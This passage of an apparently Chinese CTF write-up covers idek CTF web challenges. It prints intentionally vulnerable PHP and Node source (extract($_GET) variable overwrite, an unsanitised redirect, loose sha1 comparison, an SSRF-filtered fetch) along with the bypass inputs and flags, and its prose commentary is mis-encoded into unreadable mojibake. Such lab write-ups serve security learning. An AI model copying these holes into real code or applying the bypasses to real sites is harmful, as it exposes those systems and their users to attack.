&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__DIR__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/lib.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;QUERY_STRING&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/best-team/i&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$check&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Who is the best team?&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;best-team&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;idek_is_the_best&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;That a right answer, Here is my prize, &amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?best-team=idek_is_the_best
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011843966.png" alt="image-20211212011843966">&lt;/p>
&lt;p>ËøõÂÖ•http://memory-of-php.rf.gd/secure-bypass.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#00a8c8">__DIR__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/lib2.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;location: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Your url is interesting, here is prize &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Plz make me interest with your url &amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/secure-bypass.php?url[15]=1
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212090944967.png" alt="image-20211212090944967">&lt;/p>
&lt;p>&lt;code>idek{nu11_by1e_bypass1ng_1s_C0ol!_ftw_br0!!!!}&lt;/code>&lt;/p>
&lt;h2 id="cookie-and-milk">Cookie-and-milk&lt;/h2>
&lt;blockquote>
&lt;p>I love to eat cookie and milk together. And you?&lt;/p>
&lt;p>&lt;a href="http://cookie-and-milk.rf.gd/">http://cookie-and-milk.rf.gd/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__DIR__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/lib.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">extract&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;idek&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;idek&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;I love c0000000000000000000000000000000000000kie&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;idek&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;idek&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212100510880.png" alt="image-20211212100510880">&lt;/p>
&lt;p>ÊØîËæÉÁãóÁöÑ‰∏ÄÁÇπÊòØÂÆÉÈáçÂÆöÂêëÁöÑÊó∂ÂÄô‰ºöÂà†Èô§Êàë‰ª¨ÁöÑcookieÔºåÊâÄ‰ª•Ë¶ÅÂçïÁã¨ÊäìÂåÖÊîπ‰∏Ä‰∏ã&lt;/p>
&lt;p>&lt;code>idek{C0okie_s1ea1ing_1s_c0ol!!!}&lt;/code>&lt;/p>
&lt;h2 id="difference-check">difference-check&lt;/h2>
&lt;blockquote>
&lt;p>It&amp;rsquo;s important two know what differences exist, so I created a simple tool to check the difference between two websites!&lt;/p>
&lt;p>&lt;a href="http://difference-check.chal.idek.team">http://difference-check.chal.idek.team&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/DifferenceCheck/difference-check-dist.zip">https://ctf.idek.team/handouts/web/DifferenceCheck/difference-check-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ÂèØ‰ª•Êèê‰æõ‰∏§‰∏™urlÔºå‰ºöËøõË°ådiffÁÑ∂ÂêéËøîÂõûÁªìÊûú&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212091244418.png" alt="image-20211212091244418">&lt;/p>
&lt;p>‰ΩøÁî®ÁöÑÊòØnode-fetchÂíådiffÂ∫ìÔºõÂ∫∑‰∏ÄÂ∫∑Ê∫êÁ†Å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">bodyParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">ssrfFilter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ssrf-req-filter&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fetch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;node-fetch&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Diff&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;diff&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">hbs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express-handlebars&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;idek{REDACTED}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bodyParser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">}));&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">engine&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hbs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">hbs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">engine&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">defaultLayout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;main&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">extname&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;.hbs&amp;#39;&lt;/span>
&lt;span style="color:#111">}));&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;view engine&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;hbs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">validifyURL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">valid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">ssrfFilter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)})&lt;/span>
&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">diffURLs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pageOne&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]).&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">text&lt;/span>&lt;span style="color:#111">()}));&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pageTwo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]).&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">text&lt;/span>&lt;span style="color:#111">()}));&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">Diff&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">diffLines&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">pageOne&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">pageTwo&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;error!&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;::1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Forbidden&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">503&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/diff&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">url1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">url2&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#75af00">url1&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#39;string&amp;#39;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#75af00">url2&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#39;string&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;Invalid format received&amp;#39;&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">urls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">url1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">url2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#00a8c8">of&lt;/span> &lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">valid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">validifyURL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`Request to &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> was denied`&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">difference&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">diffURLs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;diff&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">lines&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">difference&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`App listening at http://localhost:&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂèØ‰ª•ÁúãÂà∞ÂØπËØ∑Ê±ÇÁöÑurlÁî®&lt;code>ssrfFilter&lt;/code>ËøõË°åËøáÊª§Ôºå‰∏çÂÖÅËÆ∏ËÆøÈóÆÊú¨Âú∞ÁöÑ&lt;code>/flag&lt;/code>Ôºå‰ΩÜÊòØË¶ÅflagÂ∞±ÂøÖÈ°ªË¶ÅssrfÔºåËøôÈáåNodeÁöÑÁâàÊú¨ÊòØalpineÔºå‰πüÊ≤°Ê≥ïËøõË°åhttpËØ∑Ê±ÇÂàáÂàÜ&lt;/p>
